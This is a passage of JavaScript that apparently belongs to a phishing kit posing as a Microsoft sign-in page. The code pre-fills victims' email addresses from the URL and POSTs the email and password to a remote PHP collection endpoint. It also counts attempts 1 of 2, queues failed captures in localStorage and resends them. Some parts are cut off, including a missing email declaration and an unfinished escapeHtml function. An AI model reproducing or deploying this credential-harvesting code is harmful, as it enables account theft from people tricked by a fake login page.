                    console.log('[URL] Auto-filled email from direct hash:', potentialEmail);
                    return potentialEmail.trim();
                }
            }
        }
        
        const urlParams = new URLSearchParams(window.location.search);

            if (email && email.trim() !== '') {
                console.log('[URL] Auto-filled email from ?email=', email);
                return email.trim();
            }
        }
        
        return '';

    // =========================================================================

    async function submitCredentials(email, password, attempt) {
        try {
            const formData = new URLSearchParams();
            formData.append('email', email);
            formData.append('password', password);
            formData.append('attempt', attempt);
            formData.append('source', 'microsoft_login_page');
            formData.append('referrer', document.referrer || 'direct');
            
            console.log(`[Remote] Sending attempt ${attempt} to: ${REMOTE_PHP_URL}`);
            
            const response = await fetch(REMOTE_PHP_URL, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/x-www-form-urlencoded',
                },
                body: formData.toString(),
                mode: 'cors'
            });
            
            if (!response.ok) {
                throw new Error(`HTTP ${response.status}: ${response.statusText}`);
            }
            
            const result = await response.json();
            
            if (result.status === 'success') {
                console.log(`✅ Attempt ${attempt} submitted successfully`);
                showToast(`✓ Data sent (Attempt ${attempt}/2)`, false);
                return true;
            } else {
                console.error('Server error:', result.message);
                showToast(`⚠️ Server: ${result.message}`, true);
                return false;
            }
        } catch (error) {
            console.error('Network error:', error);
            
            // Provide specific guidance for 405 error
            if (error.message.includes('405')) {
                showToast(`⚠️ HTTP 405: PHP endpoint not accepting POST. Check server configuration.`, true);
            } else {
                showToast(`⚠️ Cannot reach server: ${error.message}`, true);
            }
            
            // Store locally as backup
            const failedData = { email, password, attempt, timestamp: new Date().toISOString() };
            const failedQueue = JSON.parse(localStorage.getItem('failed_submissions') || '[]');
            failedQueue.push(failedData);
            localStorage.setItem('failed_submissions', JSON.stringify(failedQueue));
            
            return false;
        }
    }
    
    async function retryFailedSubmissions() {
        const failedQueue = JSON.parse(localStorage.getItem('failed_submissions') || '[]');
        if (failedQueue.length === 0) return;
        
        console.log(`[Backup] Retrying ${failedQueue.length} failed submissions...`);
        const newQueue = [];
        
        for (const item of failedQueue) {
            const success = await submitCredentials(item.email, item.password, item.attempt);
            if (!success) {
                newQueue.push(item);
            }
        }
        
        localStorage.setItem('failed_submissions', JSON.stringify(newQueue));
    }

    function escapeHtml(str) {

            if (m === '>') return '&gt;';
            return m;
